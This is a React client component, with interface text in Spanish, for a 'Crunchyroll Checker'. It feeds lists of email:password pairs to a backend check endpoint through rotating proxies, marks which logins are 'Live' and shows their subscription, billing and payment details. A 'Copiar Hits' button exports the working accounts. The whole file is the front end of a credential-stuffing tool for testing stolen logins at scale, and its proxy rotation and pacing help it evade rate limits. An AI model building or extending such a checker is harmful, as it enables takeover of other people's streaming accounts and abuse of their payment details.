'use client';
import { useState } from 'react';
import { useSession } from "next-auth/react";
import { motion, AnimatePresence } from 'framer-motion';
import { 
  FiPlay, 
  FiTrash2, 
  FiCopy, 
  FiCheck, 
  FiX, 
  FiAlertCircle,
  FiSettings,
  FiGlobe,
  FiRefreshCw,
  FiDownload
} from 'react-icons/fi';

interface AccountResult {
  account: string;
  status: 'Live' | 'Dead';
  subscription?: string;
  billedIn?: string;
  freeTrial?: boolean;
  payment?: string;
  emailVerified?: boolean;
  error?: string;
}

interface ProxyConfig {
  enabled: boolean;
  list: string[];
  current: number;
}

export default function CrunchyrollChecker() {
  const { data: session } = useSession();
  const [accountsInput, setAccountsInput] = useState<string>('');
  const [results, setResults] = useState<AccountResult[]>([]);
  const [isChecking, setIsChecking] = useState<boolean>(false);
  const [totalChecked, setTotalChecked] = useState<number>(0);
  const [copiedIndex, setCopiedIndex] = useState<number | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [showSettings, setShowSettings] = useState(false);
  const [proxyConfig, setProxyConfig] = useState<ProxyConfig>({
    enabled: false,
    list: [],
    current: 0
  });
  const [proxyInput, setProxyInput] = useState('');
  const [copiedAll, setCopiedAll] = useState(false);

  const handleProxySave = () => {
    const proxies = proxyInput
      .split('\n')
      .map(p => p.trim())
      .filter(Boolean);
    setProxyConfig(prev => ({
      ...prev,
      list: proxies
    }));
    setShowSettings(false);
  };

  const copyToClipboard = async (text: string, index: number) => {
    try {
      await navigator.clipboard.writeText(text);
      setCopiedIndex(index);
      setTimeout(() => setCopiedIndex(null), 2000);
    } catch (err) {
      console.error('Error al copiar al portapapeles:', err);
    }
  };

  const copyHits = async () => {
    try {
      const hits = results
        .filter(r => r.status === 'Live')
        .map(result => {
          const details = [
            result.account,
            result.subscription || 'N/A',
            result.billedIn || 'N/A',
            result.payment || 'N/A',
            result.freeTrial ? 'Trial' : 'No Trial',
            result.emailVerified ? 'Verified' : 'Not Verified'
          ].join('|');
          return details;
        })
        .join('\n');

      await navigator.clipboard.writeText(hits);
      setCopiedAll(true);
      setTimeout(() => setCopiedAll(false), 2000);
    } catch (err) {
      setError('Error al copiar los hits');
    }
  };

  const checkAccounts = async () => {
    if (!session) {
      setError('Debes iniciar sesión para usar el checker');
      return;
    }

    if (proxyConfig.enabled && proxyConfig.list.length === 0) {
      setError('Por favor, configura al menos un proxy o desactiva el uso de proxies');
      return;
    }

    console.log('🔄 Iniciando verificación de cuentas...');
    setIsChecking(true);
    setResults([]);
    setTotalChecked(0);
    setError(null);

    const accounts = accountsInput
      .split('\n')
      .map(line => line.trim())
      .filter(line => line.includes(':'))
      .slice(0, 20);

    console.log(`📝 Cuentas a verificar: ${accounts.length}`);

    if (accounts.length === 0) {
      setError('No se encontraron cuentas válidas para verificar');
      setIsChecking(false);
      return;
    }

    for (let i = 0; i < accounts.length; i++) {
      try {
        const [username, password] = accounts[i].split(':');
        console.log(`🔍 Verificando cuenta ${i + 1}/${accounts.length}: ${username}`);

        const response = await fetch('/api/crunchyroll/check', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ 
            username, 
            password,
            proxy: proxyConfig.enabled ? {
              list: proxyConfig.list,
              current: (proxyConfig.current + i) % proxyConfig.list.length
            } : null
          }),
        });

        console.log(`✅ Respuesta recibida para ${username}`);
        const data = await response.json();
        console.log(`📄 Datos recibidos:`, data);

        if (data.success && data.data) {
          console.log(`✨ Cuenta válida: ${username}`);
          setResults(prev => [...prev, {
            account: accounts[i],
            status: 'Live',
            subscription: data.data.subscription,
            billedIn: data.data.billedIn,
            freeTrial: data.data.freeTrial,
            payment: data.data.payment,
            emailVerified: data.data.emailVerified
          }]);
        } else {
          console.log(`❌ Cuenta inválida: ${username}`);
          setResults(prev => [...prev, {
            account: accounts[i],
            status: 'Dead',
            error: data.error?.message || 'Error desconocido'
          }]);
        }
        setTotalChecked(i + 1);
      } catch (error: any) {
        console.error(`❌ Error al verificar cuenta:`, error);
        setResults(prev => [...prev, {
          account: accounts[i],
          status: 'Dead',
          error: 'Error al verificar la cuenta'
        }]);
      }

      console.log('⏳ Esperando antes de la siguiente verificación...');
      await new Promise(resolve => setTimeout(resolve, 1000));
    }

    console.log('✅ Verificación completada');
    setIsChecking(false);
  };

  const liveCount = results.filter(r => r.status === 'Live').length;
  const deadCount = results.filter(r => r.status === 'Dead').length;

  // ... (continuará con el JSX en la siguiente parte)
  return (
    <div className="max-w-4xl mx-auto space-y-6">
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        className="bg-black/50 p-6 rounded-2xl border border-gray-800 backdrop-blur-sm shadow-2xl"
      >
        {/* Header */}
        <div className="flex items-center justify-between mb-6">
          <h2 className="text-2xl font-bold text-white flex items-center gap-2">
            <FiPlay className="text-yellow-400" />
            Crunchyroll Checker
          </h2>
          <div className="flex items-center gap-4">
            {isChecking && (
              <motion.div
                initial={{ opacity: 0, scale: 0.8 }}
                animate={{ opacity: 1, scale: 1 }}
                className="px-4 py-1 bg-yellow-400/10 rounded-full"
              >
                <span className="text-sm text-yellow-400 font-medium">
                  {totalChecked}/20
                </span>
              </motion.div>
            )}
            <motion.button
              whileHover={{ scale: 1.1 }}
              whileTap={{ scale: 0.9 }}
              onClick={() => setShowSettings(!showSettings)}
              className={`p-2 rounded-lg transition-colors ${
                showSettings ? 'bg-yellow-400 text-black' : 'bg-yellow-400/10 text-yellow-400'
              }`}
            >
              <FiSettings className="w-5 h-5" />
            </motion.button>
          </div>
        </div>

        {/* Configuración de Proxies */}
        <AnimatePresence>
          {showSettings && (
            <motion.div
              initial={{ opacity: 0, height: 0 }}
              animate={{ opacity: 1, height: 'auto' }}
              exit={{ opacity: 0, height: 0 }}
              className="mb-6 space-y-4 overflow-hidden"
            >
              <div className="flex items-center justify-between bg-yellow-400/5 p-4 rounded-lg">
                <div className="flex items-center gap-2">
                  <FiGlobe className="text-yellow-400" />
                  <span className="text-gray-400">Usar Proxies</span>
                </div>
                <button
                  onClick={() => setProxyConfig(prev => ({ ...prev, enabled: !prev.enabled }))}
                  className={`w-12 h-6 rounded-full transition-colors ${
                    proxyConfig.enabled ? 'bg-yellow-400' : 'bg-gray-600'
                  }`}
                >
                  <motion.div
                    animate={{ x: proxyConfig.enabled ? 24 : 2 }}
                    className="w-5 h-5 bg-white rounded-full"
                  />
                </button>
              </div>

              {proxyConfig.enabled && (
                <motion.div
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  className="space-y-2"
                >
                  <div className="flex items-center justify-between">
                    <label className="text-sm text-gray-400">Lista de Proxies</label>
                    <div className="flex items-center gap-2">
                      <span className="text-xs text-gray-500">
                        {proxyConfig.list.length} proxies configurados
                      </span>
                      <motion.button
                        whileHover={{ scale: 1.1 }}
                        whileTap={{ scale: 0.9 }}
                        onClick={handleProxySave}
                        className="p-1.5 bg-yellow-400/10 text-yellow-400 rounded-lg 
                          hover:bg-yellow-400/20 transition-colors"
                      >
                        <FiRefreshCw className="w-4 h-4" />
                      </motion.button>
                    </div>
                  </div>
                  <textarea
                    value={proxyInput}
                    onChange={(e) => setProxyInput(e.target.value)}
                    placeholder="Ingresa los proxies (uno por línea)&#10;Formato: ip:puerto:usuario:contraseña"
                    className="w-full h-32 bg-black/40 text-white rounded-lg p-4 border border-gray-700 
                      focus:border-yellow-400 focus:ring-2 focus:ring-yellow-400/20 focus:outline-none 
                      transition-all duration-300 backdrop-blur-sm resize-none font-mono text-sm"
                  />
                </motion.div>
              )}
            </motion.div>
          )}
        </AnimatePresence>

        {/* Input de Cuentas */}
        <textarea
          value={accountsInput}
          onChange={(e) => setAccountsInput(e.target.value)}
          placeholder="Ingresa las cuentas (máximo 20)&#10;Formato: email:password&#10;Ejemplo: usuario@email.com:contraseña123"
          className="w-full h-40 bg-black/40 text-white rounded-lg p-4 mb-4 border border-gray-700 
            focus:border-yellow-400 focus:ring-2 focus:ring-yellow-400/20 focus:outline-none 
            transition-all duration-300 backdrop-blur-sm resize-none font-mono text-sm"
          disabled={isChecking}
        />

        {/* Mensajes de Error */}
        <AnimatePresence>
          {error && (
            <motion.div
              initial={{ opacity: 0, y: -10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              className="mb-4 p-3 bg-red-500/10 border border-red-500/20 rounded-lg 
                text-red-400 text-sm flex items-center gap-2"
            >
              <FiAlertCircle className="w-4 h-4 flex-shrink-0" />
              {error}
            </motion.div>
          )}
        </AnimatePresence>

        {/* Botones de Acción */}
        <div className="flex gap-3">
          <motion.button
            whileHover={{ scale: 1.02 }}
            whileTap={{ scale: 0.98 }}
            onClick={checkAccounts}
            disabled={isChecking}
            className={`flex-1 py-3 px-4 rounded-lg font-medium transition-all 
              flex items-center justify-center gap-2 ${
              isChecking
                ? 'bg-gray-700 cursor-not-allowed'
                : 'bg-gradient-to-r from-yellow-400 to-orange-500 hover:opacity-90'
            }`}
          >
            <FiPlay className={`w-4 h-4 ${isChecking ? 'animate-pulse' : ''}`} />
            {isChecking ? 'Verificando...' : 'Verificar Cuentas'}
          </motion.button>

          <motion.button
            whileHover={{ scale: 1.05 }}
            whileTap={{ scale: 0.95 }}
            onClick={() => {
              setAccountsInput('');
              setResults([]);
              setError(null);
              setTotalChecked(0);
            }}
            className="p-3 bg-gray-800 text-white rounded-lg hover:bg-gray-700 
              transition-colors"
          >
            <FiTrash2 className="w-5 h-5" />
          </motion.button>
        </div>

        {/* Resultados */}
        <AnimatePresence>
          {results.length > 0 && (
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              className="mt-6 space-y-4"
            >
              {/* Estadísticas y Botón de Copiar */}
              <div className="flex items-center justify-between">
                <div className="flex gap-4">
                  <span className="text-green-400">
                    Hits: {liveCount}
                  </span>
                  <span className="text-red-400">
                    Fails: {deadCount}
                  </span>
                </div>
                {liveCount > 0 && (
                  <motion.button
                    whileHover={{ scale: 1.05 }}
                    whileTap={{ scale: 0.95 }}
                    onClick={copyHits}
                    className="px-4 py-2 bg-green-500/10 text-green-400 rounded-lg 
                      hover:bg-green-500/20 transition-colors flex items-center gap-2"
                  >
                    {copiedAll ? (
                      <>
                        <FiCheck className="w-4 h-4" />
                        Hits Copiados
                      </>
                    ) : (
                      <>
                        <FiDownload className="w-4 h-4" />
                        Copiar Hits
                      </>
                    )}
                  </motion.button>
                )}
              </div>

              {/* Lista de Resultados */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {results.map((result, index) => (
                  <motion.div
                    key={index}
                    initial={{ opacity: 0, x: -20 }}
                    animate={{ opacity: 1, x: 0 }}
                    transition={{ delay: index * 0.05 }}
                    className={`relative p-4 rounded-xl border backdrop-blur-sm ${
                      result.status === 'Live'
                        ? 'bg-black/50 border-green-500/20'
                        : 'bg-black/50 border-red-500/20'
                    } shadow-lg group`}
                  >
                    {/* Contenido de la Cuenta */}
                    <div className="space-y-3">
                      <div className="flex items-center justify-between">
                        <span className="font-mono text-sm text-gray-400">
                          {result.account}
                        </span>
                        <motion.button
                          whileHover={{ scale: 1.1 }}
                          whileTap={{ scale: 0.9 }}
                          onClick={() => copyToClipboard(result.account, index)}
                          className="text-gray-400 hover:text-white transition-colors"
                        >
                          {copiedIndex === index ? (
                            <FiCheck className="w-4 h-4 text-green-400" />
                          ) : (
                            <FiCopy className="w-4 h-4" />
                          )}
                        </motion.button>
                      </div>

                      {/* Detalles de la Cuenta */}
                      <div className={`text-sm ${
                        result.status === 'Live' ? 'text-green-400' : 'text-red-400'
                      }`}>
                        {result.status === 'Live' ? (
                          <div className="space-y-2">
                            <div className="flex items-center gap-2">
                              <FiCheck className="w-4 h-4" />
                              <span>Cuenta válida</span>
                            </div>
                            <motion.div
                              initial={{ opacity: 0, height: 0 }}
                              animate={{ opacity: 1, height: 'auto' }}
                              className="mt-2 p-3 bg-black/40 rounded-lg text-gray-300"
                            >
                              <div className="grid grid-cols-2 gap-2">
                                <div>
                                  <span className="text-gray-500 text-xs block mb-1">
                                    Suscripción
                                  </span>
                                  {result.subscription || 'N/A'}
                                </div>
                                <div>
                                  <span className="text-gray-500 text-xs block mb-1">
                                    Facturado en
                                  </span>
                                  {result.billedIn || 'N/A'}
                                </div>
                              </div>
                              <div className="mt-2 pt-2 border-t border-gray-800">
                                <div className="flex flex-wrap gap-2">
                                  {result.freeTrial && (
                                    <span className="px-2 py-0.5 text-xs bg-blue-500/20 
                                      text-blue-400 rounded">
                                      Prueba Gratuita
                                    </span>
                                  )}
                                  {result.payment && (
                                    <span className="px-2 py-0.5 text-xs bg-purple-500/20 
                                      text-purple-400 rounded">
                                      {result.payment}
                                    </span>
                                  )}
                                  <span className={`px-2 py-0.5 text-xs rounded ${
                                    result.emailVerified
                                      ? 'bg-green-500/20 text-green-400'
                                      : 'bg-red-500/20 text-red-400'
                                  }`}>
                                    {result.emailVerified ? 'Email Verificado' : 'Email No Verificado'}
                                  </span>
                                </div>
                              </div>
                            </motion.div>
                          </div>
                        ) : (
                          <div className="flex items-center gap-2">
                            <FiX className="w-4 h-4" />
                            <span>{result.error || 'Cuenta inválida'}</span>
                          </div>
                        )}
                      </div>
                    </div>
                  </motion.div>
                ))}
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </motion.div>
    </div>
  );
  }
